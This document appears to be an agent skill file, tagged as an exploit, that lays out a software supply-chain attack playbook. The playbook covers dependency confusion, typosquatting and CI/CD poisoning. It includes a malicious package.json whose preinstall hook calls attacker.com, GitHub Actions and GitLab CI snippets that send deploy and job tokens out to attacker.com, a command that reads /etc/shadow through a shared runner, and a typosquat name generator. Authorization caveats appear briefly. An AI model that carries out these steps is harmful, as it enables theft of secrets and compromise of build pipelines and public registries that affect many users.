---
name: supply-chain-attack
description: "Software supply chain attack methodology. Use when the target uses package managers such as npm/PyPI/Maven, has private registries, or uses CI/CD pipelines. Covers Dependency Confusion, Typosquatting, malicious package publication, CI/CD poisoning, and build server attacks"
zh-signals: "软件供应链攻击方法，涵盖依赖混淆、名称抢注、恶意包发布与 CI/CD 投毒。信号:供应链攻击,依赖混淆,名称抢注,npm,CI/CD 投毒"
when-to-use: "Use when the target uses npm/PyPI/Maven, private registries, or CI/CD pipelines and supply-chain attack paths are in scope."
metadata:
  tags: "supply-chain,dependency confusion,typosquatting,npm,pypi,cicd,pipeline,supply chain,dependency confusion"
  category: "exploit"
  mitre_attack: "T1195.001,T1195.002,T1199"
---

# Software Supply Chain Attack Methodology

> **Core idea**: don't attack the target itself, attack the upstream dependencies/build pipeline it trusts

## ⛔ Further Reading

- Detailed Dependency Confusion exploitation steps → [references/dependency-confusion.md](references/dependency-confusion.md)
- CI/CD Pipeline attack vectors → [references/cicd-attack.md](references/cicd-attack.md)

---

## Attack Surface Identification

```
Which package manager does the target use?
├─ npm (Node.js) → check npmjs.com
├─ PyPI (Python) → check pypi.org
├─ Maven (Java) → check mvnrepository.com
├─ NuGet (.NET) → check nuget.org
├─ Go modules → proxy.golang.org
├─ RubyGems → rubygems.org
└─ Container images → Docker Hub / private registry

Does the target have a private registry?
├─ Yes → Dependency Confusion is the first choice
└─ No → Typosquatting / poisoning of an existing package
```

## Phase 1: Dependency Confusion

### How It Works

```
Internal company package: @company/utils (version 1.0.0, private registry)
Attacker publishes: company-utils (version 99.0.0, public npm)

If the package manager prefers the higher version from the public source → the malicious package gets installed
```

### Discovering Private Package Names

```bash
# 1. Extract package names from the target site's JavaScript
curl -s https://target.com | grep -oE "from ['\"]@[a-zA-Z0-9/-]+['\"]"
curl -s https://target.com/main.js | grep -oE "require\(['\"][^'\"]+['\"]\)"

# 2. From leaked package.json / requirements.txt
# GitHub/GitLab search
# Dependency files of the target's open source projects

# 3. DNS probing (some private npm registries use a DNS CNAME)
dig +short _npmrc.target.com

# 4. Error message leaks
# The 404 page may expose internal package names
```

### Attack Execution (npm example)

```json
// package.json — malicious package
{
  "name": "target-internal-utils",
  "version": "99.0.0",
  "scripts": {
    "preinstall": "curl https://attacker.com/callback?pkg=$npm_package_name&host=$(hostname)"
  }
}
```

```bash
# Publish to the public npm registry
npm publish

# Wait for the target CI/CD pipeline to pull it on the next build
```

### Package Manager Differences

| Package manager | Confusion condition | Defense |
|---------|--------------|------|
| npm | No scope(@) prefix + no .npmrc pinning | Use @scope + registry pinning |
| pip | No --index-url pinning + no --extra-index-url | Use a single source via --index-url |
| Maven | No mirrorOf configuration | Use a repository allowlist |
| NuGet | Multi-source configuration + no version pinning | Pin the source with nuget.config |

## Phase 2: Typosquatting

```bash
# Generate lookalike names for the target package
# crossenv vs cross-env
# electorn vs electron
# cofee-script vs coffee-script

# Python implementation
python3 -c "
import itertools
pkg = 'requests'
typos = []
# delete one character
for i in range(len(pkg)):
    typos.append(pkg[:i] + pkg[i+1:])
# swap adjacent characters
for i in range(len(pkg)-1):
    typos.append(pkg[:i] + pkg[i+1] + pkg[i] + pkg[i+2:])
# add common suffixes
typos.extend([pkg+'-python', pkg+'-py', 'python-'+pkg, pkg+'2', pkg+'3'])
print('\n'.join(set(typos)))
"

# Check which names are not yet registered on the public registries
# npm: npm view <name> returns 404 = registerable
# PyPI: curl -s https://pypi.org/pypi/<name>/json returns 404 = registerable
```

## Phase 3: CI/CD Pipeline Attacks

### Attack Vectors

```
CI/CD attack surface:
├─ Source repository
│   ├─ PR injection (a malicious PR modifies CI configuration)
│   ├─ Branch Protection bypass
│   └─ Webhook hijacking
│
├─ Build environment
│   ├─ Build script injection (Makefile/Dockerfile/Jenkinsfile)
│   ├─ Environment variable theft (secrets in env)
│   ├─ Build cache poisoning
│   └─ Shared Runner escape
│
├─ Artifact repository
│   ├─ Image replacement (tag overwrite)
│   ├─ Package signature bypass
│   └─ Version number squating
│
└─ Deployment phase
    ├─ Deployment key theft
    ├─ Configuration injection (Helm values/Terraform vars)
    └─ Runtime environment variable injection
```

### GitHub Actions Attack Example

```yaml
# Modify .github/workflows/ci.yml in a malicious PR
# Or abuse the pull_request_target event (runs in the base context, can access secrets)
name: CI
on:
  pull_request_target:  # ⛔ DANGER: executes in a context that holds secrets
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
        with:
          ref: ${{ github.event.pull_request.head.sha }}  # check out the attacker code
      - run: |
          # steal repository secrets
          curl -X POST https://attacker.com/exfil \
            -d "token=${{ secrets.DEPLOY_TOKEN }}"
```

### GitLab CI/CD Attacks

```yaml
# .gitlab-ci.yml injection
stages:
  - build

build:
  stage: build
  script:
    # abuse CI/CD variables to steal secrets
    - "curl https://attacker.com/exfil?key=$CI_JOB_TOKEN"
    # or abuse the Docker socket of a shared Runner
    - docker run -v /:/host alpine cat /host/etc/shadow
```

## Phase 4: Malicious Package Payload Design

```
Callback on install (to verify attack reachability):
├─ npm: scripts.preinstall / postinstall
├─ pip: setup.py install (runs during setup())
├─ Maven: maven-exec-plugin in pom.xml
└─ Go: init() function

⛔ In legitimate red team testing:
├─ Only perform DNS/HTTP callbacks to confirm reachability
├─ Do not exfiltrate real data
├─ Do not deploy persistence
├─ State "This is a security test" inside the package
└─ Contact the target's security team promptly to report the findings
```

## OPSEC Notes

```
Supply chain attacks carry very high legal risk:
├─ ⛔ Unauthorized Dependency Confusion may constitute a crime
├─ ⛔ Typosquatting public packages affects non-target users
├─ ✓ Explicit written authorization is mandatory
├─ ✓ Callbacks collect only the minimum information (package name + hostname)
├─ ✓ Note in the package description that this is a security test
└─ ✓ Take the malicious package down immediately after the test
```

